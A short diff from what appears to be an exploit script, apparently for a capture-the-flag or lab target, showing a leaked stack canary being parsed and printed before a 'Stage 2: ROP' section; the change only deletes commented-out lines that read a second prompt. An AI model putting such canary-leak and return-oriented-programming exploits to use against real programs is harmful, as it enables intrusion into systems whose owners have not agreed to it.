@@ -32,10 +32,6 @@ canary = int(m.group(1), 16)
 
 print(f"[+] canary = {canary:#x}")
 
-# Wait for second prompt
-#data = s.recv(4096)
-#print(data.decode(errors="replace"), end="")
-
 # -----------------------------
 # Stage 2: ROP
 # -----------------------------
